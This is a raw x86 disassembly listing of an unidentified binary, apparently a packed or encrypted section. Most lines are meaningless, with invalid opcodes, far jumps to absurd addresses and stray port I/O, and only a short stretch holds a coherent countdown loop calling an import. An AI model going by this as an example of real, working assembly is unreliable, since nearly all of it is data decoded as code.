  419693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419694:	or     eax,0xd676e312
  419699:	jae    0x41962d
  41969b:	add    BYTE PTR gs:[esi+0x33],bh
  41969f:	nop
  4196a0:	jecxz  0x419707
  4196a2:	jne    0x41970c
  4196a4:	call   0xdaa4568
  4196a9:	jo     0x4196f2
  4196ab:	push   ebp
  4196ac:	(bad)  
  4196ae:	and    ah,BYTE PTR [esi-0x5b23b6fe]
  4196b4:	sbb    eax,DWORD PTR [edi-0x64d25651]
  4196ba:	jle    0x41965d
  4196bc:	and    DWORD PTR [ecx],ebp
  4196be:	inc    ecx
  4196bf:	and    BYTE PTR [edx+0x6e],bl
  4196c2:	mov    ebx,0xd0a39268
  4196c7:	mov    al,0x2e
  4196c9:	pop    esp
  4196ca:	les    edx,FWORD PTR [esi]
  4196cc:	mov    DWORD PTR [ebx+eax*2],edx
  4196cf:	stc    
  4196d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196d1:	mov    ds:0xa1cbcbdc,eax
  4196d6:	idiv   DWORD PTR [edi]
  4196d8:	lods   al,BYTE PTR gs:[esi]
  4196da:	js     0x4196ab
  4196dc:	sti    
  4196dd:	repnz dec ebp
  4196df:	mov    dl,0x5e
  4196e1:	nop
  4196e2:	jmp    0x4196d8
  4196e4:	lock mov al,ds:0xe095452c
  4196ea:	out    dx,al
  4196eb:	sti    
  4196ec:	pop    esi
  4196ed:	std    
  4196ee:	and    al,0x49
  4196f0:	pop    ss
  4196f1:	test   BYTE PTR [eax+0x6c],cl
  4196f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196f5:	mov    ch,0xa3
  4196f7:	sub    eax,edi
  4196f9:	jns    0x41967e
  4196fb:	jae    0x4196ce
  4196fd:	mov    ch,0xfc
  4196ff:	sbb    ah,BYTE PTR [esi-0xe9d57d7]
  419705:	stos   DWORD PTR es:[edi],eax
  419706:	sbb    BYTE PTR [edx+0x4b],bl
  419709:	dec    edx
  41970a:	sub    al,0x22
  41970c:	jle    0x419763
  41970e:	pop    ebp
  41970f:	sub    DWORD PTR [eax+0x4b],edx
  419712:	fsubr  st,st(7)
  419714:	ja     0x419776
  419716:	pop    eax
  419717:	into   
  419718:	dec    esi
  419719:	mov    ecx,0x2b5c99fd
  41971e:	inc    edi
  41971f:	lock pop esi
  419721:	cmc    
  419722:	in     al,dx
  419723:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  41972a:	mov    DWORD PTR ds:0x42a3c5,0x1e
  419734:	cmp    DWORD PTR ds:0x42a3c5,0x0
  41973b:	je     0x419c82
  419741:	cmp    DWORD PTR ds:0x42a3c5,0x20
  419748:	jne    0x41975c
  41974e:	push   0x7cac
  419753:	push   DWORD PTR [ebp-0x20]
  419756:	call   DWORD PTR ds:0x4251e4
  41975c:	mov    edx,DWORD PTR ds:0x42a3c5
  419762:	dec    edx
  419763:	mov    DWORD PTR ds:0x42a3c5,edx
  419769:	jmp    0x419734
  41976e:	adc    edx,edx
  419770:	jmp    0x419c82
  419775:	mov    bh,0xcc
  419778:	rcl    ecx,cl
  41977a:	fcmovnb st,st(5)
  41977c:	fnstcw WORD PTR [eax+0x60]
  41977f:	or     bh,al
  419781:	jo     0x419765
  419783:	test   al,0x67
  419785:	push   es
  419786:	icebp  
  419787:	jg     0x419801
  419789:	jae    0x419807
  41978b:	js     0x419805
  41978d:	imul   ecx,ebp,0xffffffe3
  419790:	(bad)
  419793:	inc    ecx
  419794:	in     eax,0xd8
  419796:	in     al,0xd2
  419798:	sub    eax,0x14e272b5
  41979d:	adc    ch,BYTE PTR [ebx]
  41979f:	sbb    BYTE PTR [edx+0x6e6352cb],0x89
  4197a6:	cli    
  4197a7:	cwde   
  4197a8:	cmc    
  4197a9:	test   al,0x45
  4197ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197ac:	les    ecx,FWORD PTR [edx+0x1c71c895]
  4197b2:	xchg   BYTE PTR [edx],dh
  4197b4:	clc    
  4197b5:	popf   
  4197b6:	gs pop es
  4197b8:	shr    DWORD PTR ds:0x6666af67,1
  4197be:	jbe    0x4197dd
  4197c0:	jmp    0x7afa73b6
  4197c5:	ficom  DWORD PTR [edx+0x13f48167]
  4197cb:	pop    DWORD PTR [edi]
  4197cd:	cmp    esi,eax
  4197cf:	cmp    esi,eax
  4197d1:	lds    edx,FWORD PTR fs:[esp+edx*8]
  4197d5:	jbe    0x4197c5
  4197d7:	ret    0x673b
  4197da:	ins    BYTE PTR es:[edi],dx
  4197db:	test   BYTE PTR [eax+0xc73f20d],bl
  4197e1:	mov    ebp,0x99236cb2
  4197e6:	mov    WORD PTR [esi+0x8cef3f7],ss
  4197ec:	fwait
  4197ed:	pop    ebp
  4197ee:	jle    0x419846
  4197f0:	pop    ss
  4197f1:	int    0x33
  4197f3:	in     al,0x7f
  4197f5:	(bad)  
  4197f6:	nop
  4197f7:	mov    eax,ds:0xa0f6c2df
  4197fc:	mov    dl,0x2e
  4197fe:	sub    ebp,DWORD PTR [edi-0xb]
  419801:	sub    ah,BYTE PTR [esp+eax*2-0x76b1620b]
  419808:	mov    bl,0xcd
  41980a:	jo     0x4197b7
  41980c:	ins    DWORD PTR es:[edi],dx
  41980d:	(bad)  
  41980e:	nop
  41980f:	jbe    0x41980d
  419811:	mov    eax,0x5013cf17
  419816:	inc    edx
  419817:	xor    BYTE PTR [esi],dh
  419819:	mov    al,ds:0xbfc492bf
  41981e:	sbb    DWORD PTR [esi],edx
  419820:	xor    eax,0x5945655a
  419825:	out    dx,eax
  419826:	adc    eax,0x49a4d4db
  41982b:	pop    eax
  41982c:	jle    0x4197fd
  41982e:	dec    edi
  41982f:	mov    edx,0x2deb88f8
  419834:	shr    ebp,1
  419836:	push   0x81a26db1
  41983b:	push   ebx
  41983c:	cs jo  0x41981e
  41983f:	and    DWORD PTR fs:[eax],ecx
  419842:	retf   0xd4a0
  419845:	inc    DWORD PTR [edi+ebp*2+0x26c32f93]
  41984c:	sbb    eax,0xd2443272
  419851:	aam    0x0
  419853:	std    
  419854:	hlt    
  419855:	mov    ah,0x62
  419857:	inc    ecx
  419858:	sbb    al,0x49
  41985a:	fdivr  st,st(7)
  41985c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41985d:	dec    esp
  41985e:	(bad)  
  41985f:	and    BYTE PTR [ebp+0x6d],dl
  419862:	adc    dl,0x3f
  419865:	add    eax,0x662e8682
  41986a:	mov    ebx,0xff9d5861
  41986f:	and    BYTE PTR [ecx],ah
  419871:	int3   
  419872:	jmp    0x419871
  419874:	mov    DWORD PTR [edi-0x2e],ebp
  419877:	add    eax,0xd19857ed
  41987c:	clc    
  41987d:	mov    BYTE PTR [eax-0x32],bh
  419880:	dec    ebx
  419881:	mov    dh,0xfd
  419883:	mov    ebx,0x84027e8b
  419888:	scas   eax,DWORD PTR es:[edi]
  419889:	fld    st(6)
  41988b:	inc    ebx
  41988c:	add    BYTE PTR [ebp+0x43145f08],0x3b
  419893:	ret    
  419894:	mov    dh,0xa5
  419896:	pop    edi
  419897:	and    BYTE PTR [ecx],bh
  419899:	and    DWORD PTR [ebx-0x77],ebx
  41989c:	cmp    eax,0x7727fdf6
  4198a1:	mov    al,BYTE PTR [esi-0x52ca5eb4]
  4198a7:	test   BYTE PTR ds:0xd2463d9c,cl
  4198ad:	pusha  
  4198ae:	push   eax
  4198af:	retf   
  4198b0:	or     BYTE PTR [esi],dh
  4198b2:	fsub   QWORD PTR [edi-0x48d29ffd]
  4198b8:	adc    ebp,DWORD PTR [eax-0x36]
  4198bb:	rcr    DWORD PTR [ecx+0x10],cl
  4198be:	adc    ah,bl
  4198c0:	je     0x4198dd
  4198c2:	ret    0x929f
  4198c5:	frstor [ebx]
  4198c7:	clc    
  4198c8:	hlt    
  4198c9:	pop    ebp
  4198ca:	add    bh,dl
  4198cc:	lock push esi
  4198ce:	aaa    
  4198cf:	pop    edi
  4198d0:	xchg   ebp,eax
  4198d1:	dec    eax
  4198d2:	inc    ecx
  4198d3:	(bad)  
  4198d4:	sub    ecx,DWORD PTR [ebp-0x3960c317]
  4198da:	push   ss
  4198db:	lods   eax,DWORD PTR ds:[esi]
  4198dc:	push   esi
  4198dd:	sbb    BYTE PTR [eax],bl
  4198df:	dec    esi
  4198e0:	jne    0x419874
  4198e2:	dec    ebp
  4198e3:	call   0x15ccfc66
  4198e8:	dec    esi
  4198e9:	shl    BYTE PTR [edx+ecx*2-0x6a],1
  4198ed:	xchg   edx,eax
  4198ee:	mov    BYTE PTR [esp+edx*2+0x4db2392b],bh
  4198f5:	shr    BYTE PTR [eax],1
  4198f7:	div    DWORD PTR [eax-0x28]
  4198fa:	aad    0x35
  4198fc:	sub    bl,bl
  4198fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198ff:	mov    eax,ds:0xaea33d9c
  419904:	xor    edx,ecx
  419906:	into   
  419907:	mov    al,ds:0x189708f
  41990c:	mov    ds:0xea2512f3,eax
  419911:	pusha  
  419912:	int3   
  419913:	ds xor eax,0xe983c65f
  419919:	scas   eax,DWORD PTR es:[di]
  41991b:	(bad)  
  41991c:	sbb    BYTE PTR [eax-0x51],cl
  41991f:	fs sub al,0xe0
  419922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419923:	pop    es
  419924:	jl     0x4198da
  419926:	mov    ebp,0x8e13cd82
  41992b:	dec    ebp
  41992c:	add    ecx,ecx
  41992e:	ud2    
  419930:	add    DWORD PTR [eax-0x7744de5a],esi
  419936:	mov    ebp,0x96805a86
  41993b:	inc    ebx
  41993c:	ret    0xb3b6
  41993f:	js     0x41992a
  419941:	(bad)  
  419942:	cmp    ch,ch
  419944:	sub    esi,DWORD PTR [ebp-0x1e]
  419947:	sbb    al,0xed
  419949:	popa   
  41994a:	push   ebx
  41994b:	lea    esi,[ebp-0x4bc42410]
  419951:	xchg   esp,eax
  419952:	and    BYTE PTR [eax+0x5f63d933],cl
  419958:	push   edx
  419959:	sbb    eax,0xb3f59f3e
  41995e:	in     eax,dx
  41995f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419960:	sbb    al,0xc8
  419962:	mov    eax,DWORD PTR [edx]
  419964:	lea    edi,[edx]
  419966:	aad    0x83
  419968:	add    al,0xcc
  41996a:	imul   esp,edx,0xe
  41996d:	mov    ch,0x7f
  41996f:	call   0xce43:0x640519e2
  419976:	test   BYTE PTR [esi],bh
  419978:	inc    ecx
  419979:	xor    BYTE PTR [ebp+0x0],cl
  41997c:	push   edi
  41997d:	mov    cl,0x2a
  41997f:	pop    edx
  419980:	fiadd  WORD PTR [edi]
  419982:	and    ebx,DWORD PTR [eax+0x52c9ebb4]
  419988:	xchg   bh,bl
  41998a:	mov    DWORD PTR gs:[esi],edx
  41998d:	adc    DWORD PTR [esi+0x75590cb1],ecx
  419993:	arpl   WORD PTR [ecx+ecx*2+0x752b4edf],di
  41999a:	jg     0x4199cc
  41999c:	xor    BYTE PTR [ebx],0xfb
  41999f:	scas   al,BYTE PTR es:[edi]
  4199a0:	aam    0xa7
  4199a2:	loopne 0x4199cf
  4199a4:	and    esp,DWORD PTR [ebp+0x6aa5e91c]
  4199aa:	adc    ah,BYTE PTR [edx+ebp*2+0x7c]
  4199ae:	push   es
  4199af:	mov    al,ds:0x961844b4
  4199b4:	xchg   ch,ah
  4199b6:	pop    es
  4199b7:	adc    al,0x40
  4199b9:	aam    0x99
  4199bb:	mov    ds:0x9df07e55,eax
  4199c0:	(bad)  
  4199c1:	cli    
  4199c2:	test   al,0x3e
  4199c4:	adc    DWORD PTR [esi+eax*4-0x6e],ebx
  4199c8:	adc    ebp,DWORD PTR [eax+0x57]
  4199cb:	lds    ebp,FWORD PTR [ebx-0x48d403ab]
  4199d1:	add    ebp,DWORD PTR [edi]
  4199d3:	inc    eax
  4199d4:	cmp    ecx,DWORD PTR [ecx-0x2b04d0f4]
  4199da:	push   esi
  4199db:	mov    ecx,0x4ddbcc14
  4199e0:	cld    
  4199e1:	pop    esi
  4199e2:	call   0x620fffd
  4199e7:	jecxz  0x4199e7
  4199e9:	(bad)  
  4199ea:	ins    BYTE PTR es:[edi],dx
  4199eb:	mov    dl,0x16
  4199ed:	xchg   DWORD PTR [edi+0x154a31ea],ebx
  4199f3:	fst    DWORD PTR [esi-0x6a]
  4199f6:	sbb    eax,0x8d30db7f
  4199fb:	mov    dh,bl
  4199fd:	sbb    ah,0x6f
  419a00:	(bad)  
  419a01:	repnz mov ds:0x3353a5cf,al
  419a07:	loope  0x419a86
  419a09:	inc    ecx
  419a0a:	loop   0x419a66
  419a0c:	push   0x21
  419a0e:	xor    esi,DWORD PTR [esi-0x1513abb7]
  419a14:	imul   esp,DWORD PTR [ebx-0x7e],0x2
  419a18:	inc    edi
  419a19:	icebp  
  419a1a:	hlt    
  419a1b:	and    eax,0x26a673fd
  419a20:	aas    
  419a21:	mov    cl,0xee
  419a23:	je     0x4199cb
  419a25:	cmp    eax,0x88fb3575
  419a2a:	fist   DWORD PTR [edi-0x38ed4288]
  419a30:	pop    edi
  419a31:	dec    esp
  419a32:	cmp    dh,ch
  419a34:	call   0x6891:0xe0e8dfc1
  419a3b:	add    al,0x1d
  419a3d:	mov    ds:0xe0b1699a,eax
  419a42:	iret   
  419a43:	pop    ds
  419a44:	loope  0x419ac0
  419a46:	dec    edx
  419a47:	fs add al,0x3e
  419a4a:	jge    0x419a15
  419a4c:	sub    ecx,edi
  419a4e:	stos   BYTE PTR es:[edi],al
  419a4f:	dec    ecx
  419a50:	dec    esi
  419a51:	fmul   st(7),st
  419a53:	js     0x419a82
  419a55:	or     eax,0xf75aceb5
  419a5a:	inc    BYTE PTR [eax+0x41]
  419a5d:	inc    edi
  419a5e:	pop    edi
  419a5f:	cmp    DWORD PTR [edi+0x3e],ebx
  419a62:	ja     0x419a00
  419a64:	mov    ds:0x1fdbc2e,eax
  419a69:	mov    eax,ecx
  419a6b:	lods   al,BYTE PTR ds:[esi]
  419a6c:	push   edi
  419a6d:	mov    ebx,0x9d7e4a5f
  419a72:	pusha  
  419a73:	xchg   edi,eax
  419a74:	aas    
  419a75:	hlt    
  419a76:	sbb    ebx,DWORD PTR [edi+0x306f9298]
  419a7c:	add    al,0xfd
  419a7e:	mov    ds:0x3f0f1c5,al
  419a83:	popf   
  419a84:	mov    dl,0xf
  419a86:	mov    ds:0xb48981ff,eax
  419a8b:	push   esi
  419a8c:	xor    al,0x6e
  419a8e:	scas   eax,DWORD PTR es:[edi]
  419a8f:	sbb    eax,0x24eb79a
  419a94:	adc    edi,edx
  419a96:	pop    eax
  419a97:	stc    
  419a98:	mov    ecx,0xadccf878
  419a9d:	ret    
  419a9e:	sub    al,0xea
  419aa0:	mov    cl,0xc1
  419aa2:	in     eax,dx
  419aa3:	mov    eax,ds:0x450d475d
  419aa8:	xlat   BYTE PTR ds:[ebx]
  419aa9:	cwde   
  419aaa:	xchg   DWORD PTR [ecx+0x53],esp
  419aad:	rcl    dh,cl
  419aaf:	push   cs
  419ab0:	aas    
  419ab1:	int3   
  419ab2:	pop    edi
  419ab3:	test   al,0xfd
  419ab5:	fist   WORD PTR [ebx+0x5b]
  419ab8:	cmp    BYTE PTR [edx+0x71db620e],dl
  419abe:	lea    ebx,[ebx-0x29]
  419ac1:	pop    esi
  419ac2:	stc    
  419ac3:	leave  
  419ac4:	outs   dx,BYTE PTR ds:[esi]
  419ac5:	dec    eax
  419ac6:	lds    esi,FWORD PTR [ebx+eiz*4]
  419ac9:	mov    edi,0xfa89344d
  419ace:	sub    DWORD PTR [ecx-0x695e8ed0],eax
  419ad4:	mov    bh,0x85
  419ad6:	pop    ss
  419ad7:	and    al,0xa4
  419ad9:	xchg   edx,eax
  419ada:	xor    al,0x51
  419adc:	ins    BYTE PTR es:[edi],dx
  419add:	imul   esi,DWORD PTR [ebp+0xe],0xffffffc5
  419ae1:	or     DWORD PTR [ebx+0x62],ebx
  419ae4:	push   0x81ad44a7
  419ae9:	int    0xe3
  419aeb:	fdivr  DWORD PTR [esi]
  419aed:	xchg   edi,eax
  419aee:	fadd   st,st(3)
  419af0:	cmp    dh,al
  419af2:	jmp    0x5c1a:0xde80b22e
  419af9:	mov    bh,0xdb
  419afb:	xor    BYTE PTR [edi],dl
  419afd:	jle    0x419b15
  419aff:	mov    bh,0xf6
  419b01:	mov    esi,0x4c090205
  419b06:	shl    BYTE PTR [ebx-0x44],1
  419b09:	lock sahf 
  419b0b:	ret    
  419b0c:	inc    esp
  419b0d:	in     al,0x16
  419b0f:	mov    edx,0xc3a3b0ae
  419b14:	sbb    BYTE PTR [ecx-0x59],ah
  419b17:	pushf  
  419b18:	(bad)  [ebx]
  419b1a:	fild   QWORD PTR [ebp+0x5bac032e]
  419b20:	mov    ebp,0xed3e2872
  419b25:	mov    ds:0xeaa5e333,eax
  419b2a:	mov    WORD PTR [edi],?
  419b2c:	rol    DWORD PTR ss:[ebp-0x19],1
  419b30:	daa    
  419b31:	test   eax,0x8cce5c28
  419b36:	dec    esp
  419b37:	push   0xffffffa6
  419b39:	rcl    ebx,1
  419b3b:	mov    al,0xc1
  419b3d:	pop    ss
  419b3e:	pop    es
  419b3f:	pop    es
  419b40:	fld    TBYTE PTR [ebp+ebx*4-0x6e053918]
  419b47:	push   esi
  419b48:	inc    ebp
  419b49:	sbb    DWORD PTR [edi],0xffffff86
  419b4c:	cmp    ah,0x8b
  419b4f:	xchg   BYTE PTR [ebx-0x3a],bl
  419b52:	call   0xe0ea0eb5
  419b57:	push   ss
  419b58:	in     al,0x71
  419b5a:	clc    
  419b5b:	xchg   edx,eax
  419b5c:	in     al,0x54
  419b5e:	ins    DWORD PTR es:[edi],dx
  419b5f:	jno    0x419b9e
  419b61:	aam    0x1a
  419b63:	sub    al,0x72
  419b65:	xor    dl,BYTE PTR [ebp-0x711ba015]
  419b6b:	test   BYTE PTR [ecx],bh
  419b6d:	imul   edx,DWORD PTR [ecx+0x6fa861f3],0xffffffff
  419b74:	in     al,dx
  419b75:	hlt    
  419b76:	scas   al,BYTE PTR es:[edi]
  419b77:	jo     0x419b5e
  419b79:	push   es
  419b7a:	xchg   DWORD PTR [edx-0x6147bbf8],eax
  419b80:	mov    eax,ds:0x224be904
  419b85:	cs jp  0x419ba3
  419b88:	sbb    DWORD PTR [ebx+0x4c],0x762058a5
  419b8f:	sbb    eax,0x61840cc1
  419b94:	pop    es
  419b95:	loop   0x419be5
  419b97:	pop    eax
  419b98:	push   ecx
  419b99:	jae    0x419b86
  419b9b:	xchg   ecx,eax
  419b9c:	xor    BYTE PTR [edi],al
  419b9e:	lea    esp,[ebx+edx*1+0x18]
  419ba2:	xchg   BYTE PTR [esp+esi*1-0x772a229f],cl
  419ba9:	fst    QWORD PTR [ebx-0x3294a9f9]
  419baf:	dec    esi
  419bb0:	push   ecx
  419bb1:	fnclex 
  419bb3:	jbe    0x419b9e
  419bb5:	scas   al,BYTE PTR es:[edi]
  419bb6:	jecxz  0x419b93
  419bb8:	jae    0x419b96
  419bba:	dec    esi
  419bbb:	pop    ebp
  419bbc:	out    dx,al
  419bbd:	loop   0x419c26
  419bbf:	sub    al,0xd
  419bc1:	pop    ss
  419bc2:	out    dx,eax
  419bc3:	jns    0x419c00
  419bc5:	pusha  
  419bc6:	sub    edx,ebp
  419bc8:	adc    esp,DWORD PTR [ebp+0xd]
  419bcb:	cli    
  419bcc:	cli    
  419bcd:	(bad)  
  419bce:	jl     0x419bae
  419bd0:	mov    dh,bl
  419bd2:	add    edx,edi
  419bd4:	add    eax,0xe8424004
  419bd9:	movhps xmm7,QWORD PTR [eax+0xa7e54fa]
  419be0:	cwde   
  419be1:	add    DWORD PTR [ecx],ecx
  419be3:	in     eax,0xd1
  419be5:	addr16 loopne 0x419b94
  419be8:	xchg   esi,eax
  419be9:	adc    ecx,esi
  419beb:	rcl    BYTE PTR [ebx-0x7f7e3614],1
  419bf1:	mov    ds:0xd2a3e8ac,al
  419bf6:	jnp    0x419c04
  419bf8:	test   ah,bl
  419bfa:	pop    eax
  419bfb:	fcomp  DWORD PTR [edi]
  419bfd:	popf   
  419bfe:	shr    BYTE PTR [ebx-0x6514891f],1
  419c04:	pop    esi
  419c05:	mov    ds:0x65f52c9f,al
  419c0a:	and    bh,BYTE PTR [ebp+0x55]
  419c0d:	sti    
  419c0e:	cmp    eax,0x86f4b17f
  419c13:	je     0x419bde
  419c15:	inc    ebx
  419c16:	mov    dl,0x8f
  419c18:	imul   dh
  419c1a:	arpl   WORD PTR [edx-0x6e053623],cx
  419c20:	test   al,0xd1
  419c22:	fisubr WORD PTR [esi-0x78b37135]
  419c28:	sbb    bl,BYTE PTR [eax+0x54049760]
  419c2e:	rcr    BYTE PTR [edx],1
  419c30:	ds xchg ebp,eax
  419c32:	mov    edi,0xa2e66ae4
  419c37:	leave  
  419c38:	mov    dh,0x3
  419c3a:	dec    edi
  419c3b:	retf   0x34d3
  419c3e:	lock xor DWORD PTR [edx+0x47],0xffffffb6
  419c43:	out    dx,eax
  419c44:	das    
  419c45:	cmp    ah,dh
  419c47:	push   ss
  419c48:	out    0x28,al
  419c4a:	scas   eax,DWORD PTR es:[edi]
  419c4b:	mov    ds:0xd57c29f7,eax
  419c50:	xchg   ebx,eax
  419c51:	dec    esp
  419c52:	add    al,0x6c
  419c54:	dec    edi
  419c55:	inc    ebx
  419c56:	inc    ebx
  419c57:	xor    eax,0x994c656b
  419c5c:	or     eax,edx
  419c5e:	pop    es
  419c5f:	repz test BYTE PTR [eax-0x8cefd95],al
  419c66:	aad    0x3b
  419c68:	cwde   
  419c69:	addr16 adc al,0x3e
  419c6c:	fdivr  st(0),st
  419c6e:	xor    ch,BYTE PTR [esi+0x6f]
  419c71:	bnd jbe 0x419ce9
  419c74:	xchg   ebp,eax
  419c75:	jg     0x419c79
  419c77:	fistp  DWORD PTR [eax+0x7b5c94c6]
  419c7d:	(bad)  
  419c7e:	mov    bl,0x67
  419c80:	mov    BYTE PTR [ebp-0x39],ch
  419c83:	inc    ebp
  419c84:	int3   
  419c85:	cmp    eax,0x81f89c85
  419c8a:	loop   0x419c54
  419c8c:	add    BYTE PTR ss:[eax],al
  419c8f:	jmp    0x41a1a1
  419c94:	retf   
  419c95:	leave  
  419c96:	int    0xcb
  419c98:	int    0xdb
  419c9a:	fxch   st(1)
  419c9c:	sub    eax,0xf005fe08
  419ca1:	rcr    DWORD PTR [eax-0x61],1
  419ca4:	jns    0x419c9b
  419ca6:	jg     0x419d20
  419ca8:	jae    0x419d26
  419caa:	js     0x419d24
  419cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cad:	mov    dh,0x82
  419caf:	leave  
  419cb0:	stos   DWORD PTR es:[edi],eax
  419cb1:	cwde   
  419cb2:	fld    TBYTE PTR [edx+edx*4-0x2707ab47]
  419cb9:	mov    eax,0x7eb20873
  419cbe:	and    BYTE PTR [edi-0x39c066c1],dl
  419cc4:	xlat   BYTE PTR ds:[ebx]
  419cc5:	ret    0x2bde
  419cc8:	pop    ss
  419cc9:	inc    ebx
  419cca:	xchg   esp,eax
  419ccb:	pop    esi
  419ccc:	call   0xb286799e
  419cd1:	xchg   BYTE PTR [ebp-0x487a7a30],cl
  419cd7:	jns    0x419d14
  419cd9:	and    eax,ebp
  419cdb:	jg     0x419d07
  419cdd:	xchg   ecx,eax
  419cde:	jbe    0x419d57
  419ce0:	clc    
  419ce1:	xor    BYTE PTR [ebx-0x4efc7c19],0x71
  419ce8:	shl    DWORD PTR [esi+0x37],1
  419ceb:	mov    ds:0x9d41549c,al
  419cf0:	or     dl,BYTE PTR [ecx]
  419cf2:	and    dl,dh
  419cf4:	aas    
  419cf5:	loope  0x419d6f
  419cf7:	(bad)  
  419cf8:	iret   
  419cf9:	mov    bh,0xf6
  419cfb:	out    0xc,al
  419cfd:	(bad)  
  419cfe:	sbb    DWORD PTR [eax+0x605fc79],eax
  419d04:	rol    DWORD PTR [ebx],1
  419d06:	xchg   esi,eax
  419d07:	cs jnp 0x419d35
  419d0a:	push   esi
  419d0b:	rcl    BYTE PTR [ebx-0x41ca197f],1
  419d11:	or     dh,al
  419d13:	lea    ebx,[eax-0x27fafa1c]
  419d19:	cli    
  419d1a:	xchg   edx,eax
  419d1b:	(bad)  [eax+0x34f0766b]
  419d21:	inc    edx
  419d22:	stos   BYTE PTR es:[edi],al
  419d23:	out    0xa,eax
  419d25:	add    eax,ebx
  419d27:	push   cs
  419d28:	cmp    eax,0x1976d55
  419d2d:	test   al,0xa8
  419d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d30:	iret   
  419d31:	ja     0x419d6b
  419d33:	lods   al,BYTE PTR ds:[esi]
  419d34:	xchg   DWORD PTR [edx+0x1c],esp
  419d37:	aaa    
  419d38:	mov    ds:0xa7e0094,eax
  419d3d:	sub    esp,edx
  419d3f:	pop    eax
  419d40:	pusha  
  419d41:	add    DWORD PTR [ebp+0x1ff7b993],ecx
  419d47:	and    cl,0x77
  419d4a:	test   al,0xd
  419d4c:	leave  
  419d4d:	jle    0x419cf0
  419d4f:	push   ebp
  419d50:	xor    DWORD PTR [eax],eax
  419d52:	dec    esi
  419d53:	adc    al,0x63
  419d55:	in     eax,0xbb
  419d57:	test   eax,0x21ecd303
  419d5c:	sbb    bl,BYTE PTR [edi+0x7d]
  419d5f:	mov    ecx,0x94307a20
  419d64:	pushf  
  419d65:	sbb    eax,0x3a6daac
  419d6a:	sahf   
  419d6b:	loope  0x419da5
  419d6d:	xchg   ebx,eax
  419d6e:	sbb    al,BYTE PTR ds:[eax+0x31f56924]
  419d75:	outs   dx,DWORD PTR ds:[esi]
  419d76:	xchg   esp,eax
  419d77:	sbb    eax,0x29fab76e
  419d7c:	mov    edi,0x7a18785
  419d81:	xor    ebp,DWORD PTR [ecx]
  419d83:	ds pop ebp
  419d85:	imul   ebp,ebp,0x78
  419d88:	and    eax,0x1e9ee0da
  419d8d:	pop    ecx
  419d8e:	lahf   
  419d8f:	inc    ebp
  419d90:	enter  0xab2e,0xad
  419d94:	fidiv  WORD PTR [eax-0x43cedc01]
  419d9a:	out    0x89,eax
  419d9c:	arpl   WORD PTR [esi],ax
  419d9e:	fwait
  419d9f:	mov    bh,0xc7
  419da1:	sub    al,0x5f
  419da3:	add    DWORD PTR [edx-0x37],edi
  419da6:	adc    al,0xc8
  419da8:	pop    ss
  419da9:	jmp    0x6edb:0x51269a73
  419db0:	nop
  419db1:	popa   
  419db2:	inc    eax
  419db3:	(bad)  
  419db4:	ss int3 
  419db6:	inc    edi
  419db7:	adc    DWORD PTR [esi],ebx
  419db9:	in     al,dx
  419dba:	(bad)  
  419dbb:	fmul   DWORD PTR [edx+0x74f0614f]
  419dc1:	out    dx,al
  419dc2:	loopne 0x419e14
  419dc4:	(bad)  
  419dc5:	sub    eax,0x569974c5
  419dca:	push   0x66
  419dcc:	ins    BYTE PTR es:[edi],dx
  419dcd:	loope  0x419dae
  419dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dd0:	aaa    
  419dd1:	inc    ebx
  419dd2:	js     0x419e53
  419dd4:	mov    ecx,0xbca83c24
  419dd9:	mov    eax,ds:0x140670e5
  419dde:	or     eax,0x4ab24407
  419de3:	jb     0x419d8e
  419de5:	push   ss
  419de6:	dec    edi
  419de7:	loopne 0x419dce
  419de9:	lods   eax,DWORD PTR ds:[esi]
  419dea:	dec    ebx
  419deb:	and    eax,0x7da6db3c
  419df0:	and    edx,DWORD PTR [edi+0x4b]
  419df3:	and    eax,0xa3274a5c
  419df8:	icebp  
  419df9:	jl     0xbda2ea07
  419dff:	sub    ebp,DWORD PTR [ecx-0x6]
  419e02:	(bad)  
  419e04:	pop    es
  419e05:	dec    edi
  419e06:	or     BYTE PTR [ebp+0x22],0x75
  419e0a:	sbb    ch,BYTE PTR ds:0x16ca7259
  419e10:	dec    ch
  419e12:	shl    dl,cl
  419e14:	xlat   BYTE PTR ds:[ebx]
  419e15:	cmovs  ecx,DWORD PTR [ebx-0x1e]
  419e19:	xchg   edi,eax
  419e1a:	mov    ah,BYTE PTR cs:[edi-0x7a10f1ca]
  419e21:	mov    ds:0x869966b4,eax
  419e26:	retf   0x6485
  419e29:	xlat   BYTE PTR ds:[ebx]
  419e2a:	jecxz  0x419e63
  419e2c:	jb     0x419db7
  419e2e:	jns    0x419e37
  419e30:	outs   dx,DWORD PTR ds:[esi]
  419e31:	cmp    BYTE PTR ss:[esi+eiz*4-0x67f82fd5],dh
  419e39:	xchg   esi,eax
  419e3a:	sahf   
  419e3b:	je     0x419eaa
  419e3d:	and    ebp,DWORD PTR [edi+0xe]
  419e40:	sbb    BYTE PTR [edi],ch
  419e42:	jb     0x419e27
  419e44:	(bad)  [edx+0x4]
  419e47:	retf   0x6616
  419e4a:	and    eax,0xf436f521
  419e4f:	jnp    0x419dd9
  419e51:	jmp    0xedf:0x68d2d33a
  419e58:	mov    edi,0xcfdad33b
  419e5d:	push   esi
  419e5e:	mov    ds:0xfd80da13,eax
  419e63:	dec    eax
  419e64:	inc    edi
  419e65:	push   edi
  419e66:	sti    
  419e67:	aas    
  419e68:	outs   dx,DWORD PTR ds:[esi]
  419e69:	stc    
  419e6a:	jns    0x419eea
  419e6c:	ret    
  419e6d:	mov    ecx,DWORD PTR [ebx-0x2532e520]
  419e73:	fs dec esi
  419e75:	ret    0x89eb
  419e78:	and    DWORD PTR [esi+0x633bae1c],ebp
  419e7e:	out    dx,al
  419e7f:	pop    ebp
  419e80:	test   dh,al
  419e82:	xchg   edi,eax
  419e83:	enter  0x9fe0,0x85
  419e87:	fcom   st(5)
  419e89:	mov    bl,dl
